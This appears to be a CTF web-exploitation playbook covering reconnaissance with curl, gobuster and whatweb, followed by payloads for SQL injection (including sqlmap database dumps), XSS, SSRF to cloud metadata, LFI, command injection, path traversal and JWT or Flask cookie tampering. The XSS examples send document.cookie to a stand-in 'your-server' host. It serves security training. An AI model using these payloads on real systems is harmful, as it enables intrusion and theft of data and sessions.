# Web Exploitation Playbook

## Reconnaissance Sequence

Always start broad and narrow down. The order matters:

### Phase 1: Passive Recon (no interaction with target)

1. **Read the source**: `curl -s <url>` or browser View Source
   - HTML comments (`<!-- flag: ... -->`, `<!-- TODO: remove admin path -->`)
   - JavaScript files — search for API endpoints, hardcoded keys, flag variables
   - Hidden form fields, commented-out links
2. **Check standard paths**:
   - `/robots.txt` — disallowed paths are juicy targets
   - `/sitemap.xml` — full URL map
   - `/.git/` — if accessible, dump the repo with `git-dumper`
   - `/.env`, `/config.php.bak`, `/wp-config.php.bak` — leaked configs
   - `/admin`, `/login`, `/dashboard`, `/api`, `/debug`
3. **HTTP headers**: `curl -sI <url>`
   - `Server` header — technology fingerprinting
   - `X-Powered-By` — framework version
   - Custom headers (`X-Flag`, `X-Debug`)
   - `Set-Cookie` — session handling, encoding

### Phase 2: Active Recon

4. **Directory brute-force**:
   ```bash
   gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt -q
   # or with extensions:
   gobuster dir -u <url> -w <wordlist> -x php,txt,html,bak -q
   ```
5. **Technology fingerprinting**: `whatweb <url>`
6. **Parameter discovery**: Check forms, URL params, API endpoints

### Phase 3: Vulnerability Testing

Test each input point for vulnerabilities in this order (most common to least):

## Common Web Vulnerabilities

### SQL Injection

**Detection**: Add `'` to parameters. If you get a SQL error, it's injectable.

```
?id=1'                     → error = injectable
?id=1' OR '1'='1           → all rows = confirmed
?id=1' UNION SELECT 1,2,3-- → column count enumeration
```

**Exploitation with sqlmap**:
```bash
sqlmap -u "http://target/page?id=1" --batch --random-agent --dbs
sqlmap -u "http://target/page?id=1" --batch -D <dbname> --tables
sqlmap -u "http://target/page?id=1" --batch -D <dbname> -T <table> --dump
```

**Blind SQLi** (no error output):
- Boolean-based: `?id=1' AND 1=1--` (normal) vs `?id=1' AND 1=2--` (different)
- Time-based: `?id=1' AND SLEEP(5)--` (5s delay = injectable)

### Cross-Site Scripting (XSS)

Usually relevant in CTFs when you need to steal a cookie from a bot.

```html
<script>fetch('http://your-server/'+document.cookie)</script>
<img src=x onerror="fetch('http://your-server/'+document.cookie)">
```

### Server-Side Request Forgery (SSRF)

Look for URL parameters or functionality that fetches remote resources:
```
?url=http://localhost:8080/admin
?url=file:///etc/passwd
?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
```

### Local File Inclusion (LFI)

```
?page=../../../etc/passwd
?page=....//....//....//etc/passwd  (double encoding bypass)
?page=php://filter/convert.base64-encode/resource=index.php
```

### Command Injection

```
?ip=127.0.0.1; cat /flag.txt
?ip=127.0.0.1 | cat /flag.txt
?ip=$(cat /flag.txt)
?ip=`cat /flag.txt`
```

### Path Traversal

```
/download?file=../../../etc/passwd
/download?file=....//....//....//etc/passwd
```

### Cookie/Session Manipulation

1. Decode cookies (often base64 or JWT)
2. JWT without verification: change `alg` to `none`, modify payload
3. Flask session cookies: decode with `flask-unsign`, brute-force secret key
4. Serialized objects: look for PHP `O:` or Python pickle patterns

## Web Challenge Patterns in CTFs

| Pattern | What to look for |
|---------|-----------------|
| "Hidden admin panel" | Directory enumeration, robots.txt, source comments |
| "Login bypass" | SQL injection, default credentials, JWT manipulation |
| "Read the flag file" | LFI, command injection, SSRF to localhost |
| "Cookie-based auth" | Decode/modify cookies, session fixation |
| "API endpoint" | Parameter fuzzing, IDOR, missing auth checks |
| "Upload functionality" | File upload bypass (double extensions, MIME type, magic bytes) |

## Useful One-Liners

```bash
# Full header dump
curl -sI -X GET http://target/ | head -30

# POST with data
curl -s -X POST http://target/login -d "user=admin&pass=admin"

# Cookie manipulation
curl -s -b "session=MODIFIED_VALUE" http://target/dashboard

# Follow redirects
curl -sL http://target/redirect

# View all response headers + body
curl -sv http://target/ 2>&1
```
